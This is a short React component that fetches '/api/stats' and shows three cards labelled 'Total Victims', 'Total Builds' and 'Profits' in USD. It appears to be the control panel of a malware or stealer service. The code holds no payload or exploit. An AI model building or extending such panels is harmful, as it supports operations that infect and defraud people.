import { fetcher } from '@/lib';
import useSWR from 'swr';

export const Stats = () => {
  const { data } = useSWR('/api/stats', fetcher);
  return (
    <>
      <div className="select-none py-5 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 base:grid-cols-3 gap-3 lg:!grid-cols-3 2xl:!grid-cols-3 !relative !overflow-hidden">
        <div className="flex">
          <div className="lg:w-[270px] w-full h-[75px] rounded-md px-4 py-3 bg-gray-50 dark:bg-[#101010] border border-gray-400 dark:border-[#333]">
            <h1 className="text-black dark:text-white font-bold text-xl text-center">{data?.victims || 0}</h1>
            <p className="text-[10px] text-center uppercase tracking-[1px] font-semibold text-gray-800 dark:text-gray-200">
              Total Victims
            </p>
          </div>
        </div>
        <div className="flex justify-center">
          <div className="lg:w-[270px] w-full h-[75px] rounded-md px-4 py-3 bg-gray-50 dark:bg-[#101010] border border-gray-400 dark:border-[#333]">
            <h1 className="text-black dark:text-white font-bold text-xl text-center">{data?.builds || 0}</h1>
            <p className="text-[10px] text-center uppercase tracking-[1px] font-semibold text-gray-800 dark:text-gray-200">
              Total Builds
            </p>
          </div>
        </div>
        <div className="flex justify-center">
          <div className="lg:w-[270px] w-full h-[75px] rounded-md px-4 py-3 bg-gray-50 dark:bg-[#101010] border border-gray-400 dark:border-[#333]">
            <h1 className="text-black dark:text-white font-bold text-xl text-center">${data?.profits || 0} USD</h1>
            <p className="text-[10px] text-center uppercase tracking-[1px] font-semibold text-gray-800 dark:text-gray-200">
              Profits
            </p>
          </div>
        </div>
      </div>
    </>
  );
};
